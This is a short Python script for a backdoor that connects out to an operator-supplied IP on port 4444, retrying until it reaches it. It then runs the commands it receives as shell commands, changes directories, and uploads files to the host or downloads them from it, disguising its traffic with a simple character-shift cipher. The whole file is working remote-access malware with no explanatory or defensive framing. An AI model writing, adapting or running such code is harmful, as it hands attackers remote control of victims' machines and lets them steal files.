import socket, subprocess, os

header_size = 10
ip = input(">> ")
port = 4444

backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while ( True ):

    try:
        backdoor.connect((ip, port))
        break
    except:
        continue

key = 1000
encrypt = lambda text : ''.join(list(map(chr, [x + key for x in map(ord, text)])))
decrypt = lambda text : ''.join(list(map(chr, [x - key for x in map(ord, text)])))

def send(text):

    backdoor.send(bytes(f"{len(text):<{header_size}}{encrypt(text)}", "utf-8"))

def receive():

        new_text = True
        full_text = ''

        while ( True ):

            text = backdoor.recv(1024).decode("utf-8")

            if ( new_text ):

                text_size = int(text[:header_size])
                new_text = False

            full_text += text

            if ( len(full_text) - header_size == text_size ):
                break

        return decrypt(full_text[header_size:])

def cd(command):

    if ( command == "cd" ):
        send(f"current directory is {os.getcwd()}")

    elif ( command[3] == '"' and command[-1] == '"' ):
        try:
            os.chdir(command[4:-1])
            send(f"directory changed successfully to {os.getcwd()}")
        except:
            send("this directory doesnt exists")

    else:
        try:
            os.chdir(command.split()[1])
            send(f"directory changed successfully to {os.getcwd()}")
        except:
            send("this directory doesnt exists")

def upload_file(command):

    file_name = command.split()[1]

    if ( os.path.exists(command.split()[1]) ):
        file_name = f"@{file_name}"

    open(file_name, 'w').write(receive())

def download_file(command):

    try:
        content = open(command.split()[1], 'r').read()
        send(content)
    except:
        send('0')

def sys_command(command):

    try:
        subprocess.call(command, shell = True)
        try:
            output = subprocess.check_output(command, shell = True).decode("ascii")
            send(output)
        except:
            send("command has no output")
    except:
        send("command doesnt exist")

command_dict = {"cd" : cd, "upload_file" : upload_file, "download_file" : download_file}

def execute(command):

    if command.split()[0] in command_dict:
        for x in command_dict:
            if ( command.split()[0] == x ):
                command_dict[x](command)

    else:
        sys_command(command)

while ( True ):

    command = receive()
    execute(command)
